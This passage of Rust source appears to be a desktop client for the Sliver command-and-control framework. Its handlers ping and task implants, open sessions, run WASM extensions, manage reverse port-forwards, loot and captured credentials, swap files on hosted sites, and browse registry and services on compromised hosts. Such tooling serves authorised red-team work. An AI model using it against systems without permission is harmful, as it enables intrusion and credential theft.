                Ok(r) => info.builders = r.into_inner().builders,
                Err(e) => info.errors.push(format!("builders: {}", e.message())),
            }
            match c.get_ai_providers(commonpb::Empty {}).await {
                Ok(r) => info.ai_providers = r.into_inner().providers,
                Err(e) => info.errors.push(format!("AI providers: {}", e.message())),
            }
            op!(OpUpdate::ServerInfo(Box::new(info)));
        }
        Op::AiConversations => {
            let r = tryrpc!("AI conversations", c.get_ai_conversations(commonpb::Empty {}));
            let mut list = r.conversations;
            list.sort_by(|a, b| b.updated_at.cmp(&a.updated_at));
            op!(OpUpdate::AiConversations(list));
        }
        Op::AiConversation { id } => {
            let mut conv = tryrpc!("AI conversation", c.get_ai_conversation(clientpb::AiConversationReq { id: id.clone(), include_messages: true }));
            if conv.messages.is_empty() {
                if let Ok(m) = c.get_ai_conversation_messages(clientpb::AiConversationReq { id, include_messages: true }).await {
                    conv.messages = m.into_inner().messages;
                }
            }
            conv.messages.sort_by_key(|m| m.sequence);
            op!(OpUpdate::AiConversation(Box::new(conv)));
        }
        Op::AiDelete { id } => {
            tryrpc!("delete AI conversation", c.delete_ai_conversation(clientpb::AiConversationReq { id, include_messages: false }));
            notice!(true, "AI conversation deleted");
            if let Ok(r) = c.get_ai_conversations(commonpb::Empty {}).await {
                let mut list = r.into_inner().conversations;
                list.sort_by(|a, b| b.updated_at.cmp(&a.updated_at));
                op!(OpUpdate::AiConversations(list));
            }
        }

        // ------------------------------------------------------------ implant upkeep
        Op::Ping { target } => {
            let nonce = (std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.subsec_nanos()).unwrap_or(7) & 0x7fff_ffff) as i32;
            let started = std::time::Instant::now();
            let r = tryrpc!("ping", c.ping(sliverpb::Ping { nonce, response: None, request: Some(target.request(30)) }));
            let ms = started.elapsed().as_millis();
            if let Some(e) = resp_err(&r.response) { notice!(false, "ping: {e}"); return; }
            if target.is_beacon() {
                notice!(true, "ping queued — the beacon answers at its next check-in");
            } else if r.nonce == nonce {
                notice!(true, "ping {}: {ms} ms round trip", super::short_id(&target.key()));
            } else {
                notice!(false, "ping {}: reply nonce mismatch ({ms} ms)", super::short_id(&target.key()));
            }
        }
        Op::OpenSession { target, c2, delay_s } => {
            let c2s = if c2.trim().is_empty() { Vec::new() } else { vec![c2.trim().to_string()] };
            let r = tryrpc!("open session", c.open_session(sliverpb::OpenSession {
                c2s, delay: delay_s * 1_000_000_000, response: None, request: Some(target.request(60)),
            }));
            match resp_err(&r.response) {
                Some(e) => notice!(false, "open session: {e}"),
                None => notice!(true, "interactive session requested — it appears in Implants after the beacon's next check-in"),
            }
        }
        Op::CloseSession { target } => {
            tryrpc!("close session", c.close_session(sliverpb::CloseSession { response: None, request: Some(target.request(30)) }));
            notice!(true, "session {} closed", super::short_id(&target.key()));
            if let Ok(r) = c.get_sessions(commonpb::Empty {}).await { push!(Update::Sessions(r.into_inner().sessions)); }
        }
        Op::RefreshBeacon { id } => {
            let b = tryrpc!("beacon", c.get_beacon(clientpb::Beacon { id, ..Default::default() }));
            op!(OpUpdate::Beacon(Box::new(b)));
        }
        Op::SetEnv { target, key, value } => {
            let r = tryrpc!("setenv", c.set_env(sliverpb::SetEnvReq {
                variable: Some(commonpb::EnvVar { key: key.clone(), value: value.clone() }), request: Some(target.request(30)),
            }));
            let (ok, body) = match resp_err(&r.response) {
                Some(e) => (false, e),
                None => (true, if target.is_beacon() { "queued".into() } else { format!("{key}={value}") }),
            };
            push!(Update::Output { target: target.key(), title: format!("setenv {key}"), body, ok });
        }
        Op::UnsetEnv { target, key } => {
            let r = tryrpc!("unsetenv", c.unset_env(sliverpb::UnsetEnvReq { name: key.clone(), request: Some(target.request(30)) }));
            let (ok, body) = match resp_err(&r.response) {
                Some(e) => (false, e),
                None => (true, if target.is_beacon() { "queued".into() } else { format!("{key} removed") }),
            };
            push!(Update::Output { target: target.key(), title: format!("unsetenv {key}"), body, ok });
        }
        Op::Chown { target, path, uid, gid, recursive } => {
            let r = tryrpc!("chown", c.chown(sliverpb::ChownReq { path: path.clone(), uid: uid.clone(), gid: gid.clone(), recursive, request: Some(target.request(60)) }));
            match resp_err(&r.response) {
                Some(e) => notice!(false, "chown: {e}"),
                None => notice!(true, "chown {uid}:{gid} {path}"),
            }
        }
        Op::RportFwds { target } => rport_fwds(c, &target, upd_tx, ctx).await,
        Op::RportFwdStop { target, id } => {
            let r = tryrpc!("stop rportfwd", c.stop_rport_fwd_listener(sliverpb::RportFwdStopListenerReq { id, request: Some(target.request(30)) }));
            match resp_err(&r.response) {
                Some(e) => notice!(false, "stop rportfwd {id}: {e}"),
                None => notice!(true, "reverse port-forward {id} stopped"),
            }
            rport_fwds(c, &target, upd_tx, ctx).await;
        }
        Op::WasmList { target } => wasm_list(c, &target, upd_tx, ctx).await,
        Op::WasmRegister { target, name, wasm } => {
            let size = wasm.len();
            let r = tryrpc!("register WASM extension", c.register_wasm_extension(sliverpb::RegisterWasmExtensionReq {
                name: name.clone(), wasm_gz: gzip(&wasm), request: Some(target.request(60)),
            }));
            let (ok, body) = match resp_err(&r.response) {
                Some(e) => (false, e),
                None => (true, format!("registered ({size} bytes)")),
            };
            push!(Update::Output { target: target.key(), title: format!("wasm register {name}"), body, ok });
            if ok { wasm_list(c, &target, upd_tx, ctx).await; }
        }
        Op::WasmExec { target, name, args } => {
            let title = format!("wasm {name} {}", args.join(" ")).trim_end().to_string();
            let r = match c.exec_wasm_extension(sliverpb::ExecWasmExtensionReq {
                name, args, interactive: false, request: Some(target.request(120)), ..Default::default()
            }).await {
                Ok(r) => r.into_inner(),
                Err(e) => { push!(Update::Output { target: target.key(), title, body: e.message().into(), ok: false }); return; }
            };
            if let Some(e) = resp_err(&r.response) {
                push!(Update::Output { target: target.key(), title, body: e, ok: false });
                return;
            }
            let mut body = String::from_utf8_lossy(&r.stdout).into_owned();
            if !r.stderr.is_empty() {
                if !body.is_empty() && !body.ends_with('\n') { body.push('\n'); }
                body.push_str(&String::from_utf8_lossy(&r.stderr));
            }
            body.push_str(&format!("\n(exit code {})", r.exit_code));
            push!(Update::Output { target: target.key(), title, body, ok: r.exit_code == 0 });
        }

        // ------------------------------------------------------------ loot / creds / hosted files
        Op::RenameLoot { id, name } => {
            tryrpc!("rename loot", c.loot_update(clientpb::Loot { id, name: name.clone(), ..Default::default() }));
            notice!(true, "loot renamed to '{name}'");
            if let Ok(r) = c.loot_all(commonpb::Empty {}).await { push!(Update::Loot(r.into_inner().loot)); }
        }
        Op::CredDetail { id } => {
            let cred = tryrpc!("credential", c.get_cred_by_id(clientpb::Credential { id, ..Default::default() }));
            op!(OpUpdate::CredDetail(cred));
        }
        Op::CredsByHashType(hash_type) => {
            let r = tryrpc!("credentials by type", c.get_creds_by_hash_type(clientpb::Credential { hash_type, ..Default::default() }));
            op!(OpUpdate::CredsOfType { hash_type, ids: r.credentials.into_iter().map(|c| c.id).collect() });
        }
        Op::SniffHashType { hash } => {
            let r = tryrpc!("identify hash", c.creds_sniff_hash_type(clientpb::Credential { hash: hash.clone(), ..Default::default() }));
            op!(OpUpdate::SniffedHashType { hash, hash_type: r.hash_type });
        }
        Op::ReplaceHostedFile { website, path, content_type, data, original_file } => {
            let size = data.len() as u64;
            let content = clientpb::WebContent { path: path.clone(), content_type, size, content: data, original_file, replace_content: true, ..Default::default() };
            tryrpc!("replace hosted file", c.website_add_content(clientpb::WebsiteAddContent { name: website.clone(), contents: [(path.clone(), content)].into() }));
            notice!(true, "replaced {website}{path} ({size} bytes)");
            match super::list_websites(c).await {
                Ok(sites) => push!(Update::Websites(sites)),
                Err(e) => notice!(false, "list websites: {}", e.message()),
            }
        }
        // Sliver's WebsiteUpdateContent changes a path's Content-Type only; the bytes stay.
        Op::SetHostedContentType { website, path, content_type } => {
            let content = clientpb::WebContent { path: path.clone(), content_type: content_type.clone(), ..Default::default() };
            tryrpc!("set content type", c.website_update_content(clientpb::WebsiteAddContent { name: website.clone(), contents: [(path.clone(), content)].into() }));
            notice!(true, "{website}{path} now served as {content_type}");
            match super::list_websites(c).await {
                Ok(sites) => push!(Update::Websites(sites)),
                Err(e) => notice!(false, "list websites: {}", e.message()),
            }
        }
    }
}

async fn rport_fwds(c: &mut Rpc, target: &Target, upd_tx: &crossbeam_channel::Sender<Update>, ctx: &egui::Context) {
    match c.get_rport_fwd_listeners(sliverpb::RportFwdListenersReq { request: Some(target.request(30)) }).await {
        Ok(r) => {
            let r = r.into_inner();
            if let Some(e) = resp_err(&r.response) {
                let _ = upd_tx.send(Update::Notice { ok: false, text: format!("reverse port-forwards: {e}") });
            }
            let _ = upd_tx.send(Update::Op(OpUpdate::RportFwds { target: target.key(), listeners: r.listeners }));
        }
        Err(e) => { let _ = upd_tx.send(Update::Notice { ok: false, text: format!("reverse port-forwards: {}", e.message()) }); }
    }
    ctx.request_repaint();
}

async fn wasm_list(c: &mut Rpc, target: &Target, upd_tx: &crossbeam_channel::Sender<Update>, ctx: &egui::Context) {
    match c.list_wasm_extensions(sliverpb::ListWasmExtensionsReq { request: Some(target.request(30)) }).await {
        Ok(r) => {
            let r = r.into_inner();
            if let Some(e) = resp_err(&r.response) {
                let _ = upd_tx.send(Update::Notice { ok: false, text: format!("WASM extensions: {e}") });
            }
            let _ = upd_tx.send(Update::Op(OpUpdate::WasmExtensions { target: target.key(), names: r.names }));
        }
        Err(e) => { let _ = upd_tx.send(Update::Notice { ok: false, text: format!("WASM extensions: {}", e.message()) }); }
    }
    ctx.request_repaint();
}

fn gzip(data: &[u8]) -> Vec<u8> {
    use std::io::Write;
    let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    let _ = enc.write_all(data);
    enc.finish().unwrap_or_default()
}

async fn add_loot(c: &mut Rpc, name: String, data: Vec<u8>, text: bool, upd_tx: &crossbeam_channel::Sender<Update>, ctx: &egui::Context) {
    let size = data.len() as i64;
    let loot = clientpb::Loot {
        name: name.clone(),
        file_type: if text { clientpb::FileType::Text as i32 } else { clientpb::FileType::Binary as i32 },
        size,
        file: Some(commonpb::File { name: name.clone(), data }),
        ..Default::default()
    };
    let (ok, text) = match c.loot_add(loot).await {
        Ok(_) => (true, format!("added '{name}' to loot ({size} bytes)")),
        Err(e) => (false, format!("add loot: {}", e.message())),
    };
    let _ = upd_tx.send(Update::Notice { ok, text });
    if let Ok(r) = c.loot_all(commonpb::Empty {}).await {
        let _ = upd_tx.send(Update::Loot(r.into_inner().loot));
    }
    ctx.request_repaint();
}

async fn refresh_creds(c: &mut Rpc, upd_tx: &crossbeam_channel::Sender<Update>, ctx: &egui::Context) {
    if let Ok(r) = c.creds(commonpb::Empty {}).await {
        let _ = upd_tx.send(Update::Creds(r.into_inner().credentials));
        ctx.request_repaint();
    }
}

async fn pivot_listeners(c: &mut Rpc, target: &Target, upd_tx: &crossbeam_channel::Sender<Update>, ctx: &egui::Context) {
    match c.pivot_session_listeners(sliverpb::PivotListenersReq { request: Some(target.request(30)) }).await {
        Ok(r) => {
            let _ = upd_tx.send(Update::Op(OpUpdate::PivotListeners { target: target.key(), listeners: r.into_inner().listeners }));
        }
        Err(e) => {
            let _ = upd_tx.send(Update::Notice { ok: false, text: format!("pivot listeners: {}", e.message()) });
        }
    }
    ctx.request_repaint();
}

async fn wg_list(c: &mut Rpc, target: &Target, upd_tx: &crossbeam_channel::Sender<Update>, ctx: &egui::Context) {
    let socks = c.wg_list_socks_servers(sliverpb::WgSocksServersReq { request: Some(target.request(30)) }).await;
    let fwds = c.wg_list_forwarders(sliverpb::WgtcpForwardersReq { request: Some(target.request(30)) }).await;
    match (socks, fwds) {
        (Ok(s), Ok(f)) => {
            let _ = upd_tx.send(Update::Op(OpUpdate::WgList {
                target: target.key(), socks: s.into_inner().servers, fwds: f.into_inner().forwarders,
            }));
        }
        (Err(e), _) | (_, Err(e)) => {
            let _ = upd_tx.send(Update::Notice { ok: false, text: format!("WireGuard (session must use the wg transport): {}", e.message()) });
        }
    }
    ctx.request_repaint();
}

async fn reg_list(c: &mut Rpc, target: &Target, hive: String, path: String, upd_tx: &crossbeam_channel::Sender<Update>, ctx: &egui::Context) {
    let sub = c.registry_list_sub_keys(sliverpb::RegistrySubKeyListReq {
        hive: hive.clone(), path: path.clone(), hostname: String::new(), request: Some(target.request(30)),
    }).await;
    let vals = c.registry_list_values(sliverpb::RegistryListValuesReq {
        hive: hive.clone(), path: path.clone(), hostname: String::new(), request: Some(target.request(30)),
    }).await;
    match (sub, vals) {
        (Ok(s), Ok(v)) => {
            let (s, v) = (s.into_inner(), v.into_inner());
            if let Some(e) = resp_err(&s.response).or_else(|| resp_err(&v.response)) {
                let _ = upd_tx.send(Update::Notice { ok: false, text: format!("registry {hive}\\{path}: {e}") });
            }
            let mut subkeys = s.subkeys;
            subkeys.sort_by_key(|k| k.to_lowercase());
            let mut values = v.value_names;
            values.sort_by_key(|k| k.to_lowercase());
            let _ = upd_tx.send(Update::Op(OpUpdate::Registry { target: target.key(), hive, path, subkeys, values }));
        }
        (Err(e), _) | (_, Err(e)) => {
            let _ = upd_tx.send(Update::Notice { ok: false, text: format!("registry: {}", e.message()) });
        }
    }
    ctx.request_repaint();
}

async fn services(c: &mut Rpc, target: &Target, upd_tx: &crossbeam_channel::Sender<Update>, ctx: &egui::Context) {
    match tokio::time::timeout(Duration::from_secs(90), c.services(sliverpb::ServicesReq { hostname: String::new(), request: Some(target.request(60)) })).await {
        Ok(Ok(r)) => {
            let r = r.into_inner();
            if !r.error.is_empty() {
                // Windows refuses some services to a non-elevated user; the rest still list.
                // That partial failure goes to the event log, not an error toast.
                let first = r.error.lines().next().unwrap_or_default().to_string();
                let _ = upd_tx.send(if r.details.is_empty() {
                    Update::Notice { ok: false, text: format!("services: {}", r.error) }
                } else {
                    Update::Event(super::EventMsg { kind: "info".into(), text: format!("services: {} listed; some could not be read ({first})", r.details.len()) })
                });
            }
            let mut services = r.details;
            services.sort_by_key(|s| s.name.to_lowercase());
            let _ = upd_tx.send(Update::Op(OpUpdate::Services { target: target.key(), services }));
        }
        Ok(Err(e)) => { let _ = upd_tx.send(Update::Notice { ok: false, text: format!("services: {}", e.message()) }); }
        Err(_) => { let _ = upd_tx.send(Update::Notice { ok: false, text: "services: timed out".into() }); }
    }
    ctx.request_repaint();
}

/// Flatten the `ImplantBuilds` map into a sorted list.
fn builds_list(b: clientpb::ImplantBuilds) -> Vec<BuildInfo> {
    let mut out: Vec<BuildInfo> = b.configs.into_iter().map(|(name, cfg)| BuildInfo {
        staged: b.staged.get(&name).copied().unwrap_or(false),
        name,
        os: cfg.goos,
        arch: cfg.goarch,
        format: cfg.format,
        beacon: cfg.is_beacon,
        c2: cfg.c2.into_iter().map(|x| x.url).collect(),
    }).collect();
    out.sort_by(|a, b| a.name.cmp(&b.name));
    out
}

fn hex_preview(b: &[u8]) -> String {
    let mut s: String = b.iter().take(64).map(|x| format!("{x:02x} ")).collect();
    if b.len() > 64 { s.push_str(&format!("… ({} bytes)", b.len())); }
    s.trim_end().to_string()
}
